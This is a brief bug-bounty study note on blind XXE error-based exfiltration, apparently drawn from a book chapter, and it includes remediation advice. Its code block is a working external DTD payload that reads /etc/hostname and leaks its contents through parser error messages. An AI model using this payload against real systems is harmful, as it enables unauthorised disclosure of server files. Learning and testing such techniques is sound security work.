# Blind XXE Error-Based Exfiltration

- A blind XXE may leak file data through verbose parser errors rather than outbound HTTP exfiltration.
- Use an external DTD that injects file contents into a nonexistent file path.
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
%ent;
%error;
```
- Load that DTD from the vulnerable XML parser.
- A verbose parser may return an error such as `FileNotFoundException` containing the substituted file content.
- Inspect raw error responses/log output exposed by the application.
- False-positive trap: production error handling often suppresses parser details, preventing this technique.
- Remediation: disable external entities and return generic parser errors without sensitive paths/data.
## Source: Bug Bounty Bootcamp, Ch. 15
